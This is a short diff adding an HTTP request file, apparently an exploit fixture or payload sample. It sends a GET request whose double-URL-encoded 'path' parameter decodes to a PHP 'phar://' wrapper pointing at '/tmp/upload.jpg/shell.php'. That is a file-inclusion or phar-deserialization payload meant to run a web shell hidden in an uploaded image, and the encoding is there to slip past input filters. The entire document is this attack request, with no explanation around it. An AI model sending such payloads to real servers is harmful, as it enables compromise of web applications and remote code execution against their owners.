@@ -1,0 +1,4 @@
+GET /a?path=g%253Dphar%253A%252F%252Ftmp%252Fupload.jpg%252Fshell.php HTTP/1.1
+Host: demo.example.com
+Connection: close
+
